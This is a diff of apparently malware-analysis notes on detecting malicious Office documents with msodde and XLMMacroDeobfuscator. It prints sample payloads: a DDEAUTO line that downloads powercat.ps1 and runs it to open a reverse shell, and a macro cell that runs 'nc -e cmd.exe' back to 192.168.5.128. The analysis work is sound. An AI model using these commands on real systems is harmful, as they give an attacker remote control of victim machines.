@@ -452,44 +452,51 @@ Use **msodde** to detect and extract DDE/DDEAUTO links from MS Office documents,
      DDEAUTO c:\\windows\\system32\\cmd.exe "/k powershell -c IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.5.128/powercat.ps1');powercat -c 192.168.5.128 -p 1111 -e cmd
 
 # Excel 4.0 macros
-**XLMMacroDeobfuscator** can be used to decode obfuscated XLM macros (also known as Excel 4.0 macros)
+**XLMMacroDeobfuscator** can be used to extract or decode obfuscated XLM macros (also known as Excel 4.0 macros)
 
-    remnux@remnux:~/Desktop$ xlmdeobfuscator -f excel4macro.xls 
-    pywin32 is not installed (only is required if you want to use MS Excel)
-    
-              _        _______
-    |\     /|( \      (       )
-    ( \   / )| (      | () () |
-     \ (_) / | |      | || || |
-      ) _ (  | |      | |(_)| |
-     / ( ) \ | |      | |   | |
-    ( /   \ )| (____/\| )   ( |
-    |/     \|(_______/|/     \|
-       ______   _______  _______  ______   _______           _______  _______  _______ _________ _______  _______
-      (  __  \ (  ____ \(  ___  )(  ___ \ (  ____ \|\     /|(  ____ \(  ____ \(  ___  )\__   __/(  ___  )(  ____ )
-      | (  \  )| (    \/| (   ) || (   ) )| (    \/| )   ( || (    \/| (    \/| (   ) |   ) (   | (   ) || (    )|
-      | |   ) || (__    | |   | || (__/ / | (__    | |   | || (_____ | |      | (___) |   | |   | |   | || (____)|
-      | |   | ||  __)   | |   | ||  __ (  |  __)   | |   | |(_____  )| |      |  ___  |   | |   | |   | ||     __)
-      | |   ) || (      | |   | || (  \ \ | (      | |   | |      ) || |      | (   ) |   | |   | |   | || (\ (
-      | (__/  )| (____/\| (___) || )___) )| )      | (___) |/\____) || (____/\| )   ( |   | |   | (___) || ) \ \__
-      (______/ (_______/(_______)|/ \___/ |/       (_______)\_______)(_______/|/     \|   )_(   (_______)|/   \__/
-    
-        
-    XLMMacroDeobfuscator(v 0.1.4) - https://github.com/DissectMalware/XLMMacroDeobfuscator
-    
-    File: /home/remnux/Desktop/excel4macro.xls
-    
-    Unencrypted xls file
-    
-    [Loading Cells]
-    [Starting Deobfuscation]
-    There is no entry point, please specify a cell address to start
-    Example: Sheet1!A1
-    Macro1!A1
-    CELL:A1        , PartialEvaluation   , EXEC("nc -nv 192.168.5.128 1111 -e cmd.exe")
-    CELL:A2        , PartialEvaluation   , RETURN()
-    [END of Deobfuscation]
-    time elapsed: 5.669408082962036
+Extract: `xlmdeobfuscator -f Book1.xlsm -x`
+Extract, emulate and deobfuscate: `xlmdeobfuscator -f Book1.xlsm`
 
+```
+remnux@remnux:~/Desktop$ xlmdeobfuscator -f excel4macro.xls 
+pywin32 is not installed (only is required if you want to use MS Excel)
+
+|\     /|( \      (       )
+( \   / )| (      | () () |
+ \ (_) / | |      | || || |
+  ) _ (  | |      | |(_)| |
+ / ( ) \ | |      | |   | |
+( /   \ )| (____/\| )   ( |
+|/     \|(_______/|/     \|
+   ______   _______  _______  ______   _______           _______  _______  _______ _________ _______  _______
+  (  __  \ (  ____ \(  ___  )(  ___ \ (  ____ \|\     /|(  ____ \(  ____ \(  ___  )\__   __/(  ___  )(  ____ )
+  | (  \  )| (    \/| (   ) || (   ) )| (    \/| )   ( || (    \/| (    \/| (   ) |   ) (   | (   ) || (    )|
+  | |   ) || (__    | |   | || (__/ / | (__    | |   | || (_____ | |      | (___) |   | |   | |   | || (____)|
+  | |   | ||  __)   | |   | ||  __ (  |  __)   | |   | |(_____  )| |      |  ___  |   | |   | |   | ||     __)
+  | |   ) || (      | |   | || (  \ \ | (      | |   | |      ) || |      | (   ) |   | |   | |   | || (\ (
+  | (__/  )| (____/\| (___) || )___) )| )      | (___) |/\____) || (____/\| )   ( |   | |   | (___) || ) \ \__
+  (______/ (_______/(_______)|/ \___/ |/       (_______)\_______)(_______/|/     \|   )_(   (_______)|/   \__/
+
+
+XLMMacroDeobfuscator(v 0.1.4) - https://github.com/DissectMalware/XLMMacroDeobfuscator
+
+File: /home/remnux/Desktop/excel4macro.xls
+
+Unencrypted xls file
+
+[Loading Cells]
+[Starting Deobfuscation]
+There is no entry point, please specify a cell address to start
+Example: Sheet1!A1
+Macro1!A1
+CELL:A1, PartialEvaluation   , EXEC("nc -nv 192.168.5.128 1111 -e cmd.exe")
+CELL:A2, PartialEvaluation   , RETURN()
+[END of Deobfuscation]
+time elapsed: 5.66940808296203
+```
+
+# Zelster's Cheatsheet
+
+![image](https://user-images.githubusercontent.com/56353946/227059639-92f25596-bfdf-48af-9f6f-ba5e1e5405ab.png)
 
 
